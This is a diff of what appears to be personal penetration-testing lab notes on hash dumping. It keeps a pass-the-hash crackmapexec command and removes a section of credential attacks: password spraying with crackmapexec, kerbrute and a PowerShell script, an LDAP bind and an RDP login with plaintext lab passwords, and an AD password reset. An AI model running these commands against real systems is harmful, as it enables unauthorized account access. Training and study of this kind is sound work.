@@ -1,4 +1,4 @@
-# Hash Dumping
+## Hash Dumping
 
 ### SAM Dumping
 
@@ -25,35 +25,3 @@ samdump2 system sam # Less Reliable
 crackmapexec smb <IP> -u <user> -H aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 -x ipconfig
 ```
 
-### Other Notes
-
-```
-
-xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.205.75
-net accounts
-
-$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-$PDC = ($domainObj.PdcRoleOwner).Name
-$SearchString = "LDAP://"
-$SearchString += $PDC + "/"
-$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
-$SearchString += $DistinguishedName
-New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
-
-cd C:\Tools
-powershell -ep bypass
-.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
-
-
-cat users.txt
-crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
-
-
-crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
-
-type .\usernames.txt
-.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
-
-
-Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
-```
